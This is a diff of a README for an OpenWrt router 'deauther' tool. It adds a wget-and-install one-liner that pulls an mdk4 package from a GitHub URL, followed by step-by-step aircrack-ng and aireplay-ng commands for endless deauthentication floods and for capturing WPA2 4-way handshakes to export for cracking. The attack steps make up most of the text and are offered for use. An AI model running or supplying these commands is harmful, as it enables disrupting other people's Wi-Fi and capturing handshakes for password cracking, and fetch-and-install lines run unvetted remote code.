@@ -3,12 +3,22 @@
 - Mipsel-24kc package
 - Openwrt firmware version 22.03.*
 
+# Install package 
+```
+opkg update && opkg install airmon-ng airodump-ng aircrack-ng
+```
+# Install mdk4
+> (mipsel_24kc)
+```sh
+opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk && opkg install mdk4.ipk
+```
+
 # Notes
 - Functions similar on linux aircrack-ng aireplay-ng and mdk4
 - Can also capture WPA2 WPAWPA2PSK Handshakes
 - Doesn't work on openwrt version 23.*.* up
 
-## Root access 
+# Root access 
 ```sh
 ssh root@192.168.1.1
 ```
@@ -38,11 +48,6 @@ sh wlan0mon
 ```
 airmon-ng start wlan0
 ```
-# Install mdk4
-> (mipsel_24kc)
-```sh
-opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk && opkg install mdk4.ipk
-```
 # Scan wifi from the terminal
 ```
 iw wlan0 scan | grep BSS
@@ -51,7 +56,7 @@ iw wlan0 scan | grep BSS
 ```
 sh wlan0mon && airodump-ng wlan0mon
 ```
-## Deauth attack using mdk4
+# Deauth attack using mdk4
 > 1.Enable monitor mode
 ```
 sh wlan0mon && airodump-ng wlan0mon
@@ -75,9 +80,15 @@ aireplay-ng wlan0mon --deauth 0 -a (BSSID) --ignore-negative-one
 ```
 -------
 # Capture the 4way handshakes
+> 1.Listen to a specific bssid
 ```
+airodump-ng -c (channel) --bssid (BSSID) -w handshake wlan0mon
 ```
-## Export handshake file from openwrt to local storage
+> 2.Open a new terminal to deauth the BSSID
+```
+aireplay-ng wlan0mon --deauth 0 -a (BSSID) --ignore-negative-one
+```
+# Export the handshake
 > [!Tip]
 > install SFTP server on both system in order that SCP to work
 
